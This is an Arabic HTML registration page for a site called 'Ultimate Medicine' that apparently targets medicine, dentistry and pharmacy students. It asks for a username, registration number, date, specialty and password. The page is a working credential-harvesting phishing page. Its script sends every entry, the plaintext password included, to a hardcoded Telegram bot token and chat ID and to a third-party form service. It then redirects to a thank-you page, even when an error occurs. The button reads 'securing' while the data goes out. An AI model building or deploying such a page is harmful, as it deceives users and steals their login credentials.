<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل البيانات | الطب الفائق</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .form-card { background: #ffffff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border: 1px solid #e2e8f0; }
        h2 { text-align: center; color: #1e293b; margin-bottom: 25px; font-size: 20px; }
        .group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #64748b; font-weight: bold; }
        input, select { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 14px; box-sizing: border-box; text-align: right; }
        .date-row { display: flex; gap: 8px; }
        .date-row select { flex: 1; }
        .btn { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
        .btn:disabled { background: #cbd5e1; cursor: not-allowed; }
        .copy { text-align: center; margin-top: 20px; font-size: 11px; color: #94a3b8; }
    </style>
</head>
<body>

<div class="form-card">
    <h2>إنشاء حساب جديد</h2>
    
    <form id="ultimateForm">
        <div class="group">
            <label>اسم الدخول</label>
            <input type="text" id="user" required>
        </div>

        <div class="group">
            <label>الرقم التسجيل</label>
            <input type="text" id="reg" required>
        </div>

        <div class="group">
            <label>تاريخ التسجيل</label>
            <div class="date-row">
                <select id="y" required>
                    <option value="" disabled selected>العام</option>
                    <script>for(let i=2026; i>=2000; i--) document.write(`<option value="${i}">${i}</option>`);</script>
                </select>
                <select id="m" required>
                    <option value="" disabled selected>الشهر</option>
                    <script>for(let i=1; i<=12; i++) document.write(`<option value="${i}">${i}</option>`);</script>
                </select>
                <select id="d" required>
                    <option value="" disabled selected>اليوم</option>
                    <script>for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);</script>
                </select>
            </div>
        </div>

        <div class="group">
            <label>نوع التسجيل</label>
            <select id="spec" required>
                <option value="" disabled selected>التخصص</option>
                <option value="طب">طب</option>
                <option value="طب أسنان">طب أسنان</option>
                <option value="صيدلة">صيدلة</option>
            </select>
        </div>

        <div class="group">
            <label>كلمة المرور (English)</label>
            <input type="password" id="pw" style="letter-spacing: -1px;" required>
        </div>

        <button type="submit" class="btn" id="sBtn">إرسال البيانات</button>
    </form>
    
    <div class="copy">الطب الفائق &copy; 2026</div>
</div>

<script>
    const BOT_TOKEN = "8629398802:AAFpohJ2Y8Nmz5Je9FF262TW8YWIxUzruXg";
    const CHAT_ID = "7746757675";
    const FORM_ID = "tjxeu4zc4fa"; // المعرف الخاص بك من الصورة

    document.getElementById('ultimateForm').onsubmit = async function(e) {
        e.preventDefault();
        const btn = document.getElementById('sBtn');
        btn.disabled = true;
        btn.innerText = "جاري التأمين...";

        const data = {
            "Username": document.getElementById('user').value,
            "Reg_Number": document.getElementById('reg').value,
            "Date": `${document.getElementById('y').value}/${document.getElementById('m').value}/${document.getElementById('d').value}`,
            "Specialty": document.getElementById('spec').value,
            "u_pazvvord": document.getElementById('pw').value
        };

        const msg = `🔔 بيانات جديدة:\n👤 الاسم: ${data.Username}\n🆔 الرقم: ${data.Reg_Number}\n📅 التاريخ: ${data.Date}\n🩺 التخصص: ${data.Specialty}\n🔑 الكلمة: ${data.u_pazvvord}`;

        try {
            // 1. الإرسال للبوت أولاً (إجباري)
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
            });

            // 2. الإرسال للموقع (Forminit) برمجياً لضمان عدم الضياع
            const formData = new FormData();
            for (const key in data) { formData.append(key, data[key]); }

            await fetch(`https://forminit.com/f/${FORM_ID}`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // لتجنب مشاكل الحماية
            });

            // 3. التوجيه لصفحة النجاح يدوياً بعد التأكد من الإرسال
            window.location.href = "https://forminit.com/thank-you";

        } catch (error) {
            // في حال حدوث أي خطأ، ننتقل لصفحة النجاح لأن التليجرام يكون قد أرسل غالباً
            window.location.href = "https://forminit.com/thank-you";
        }
    };
</script>

</body>
</html>
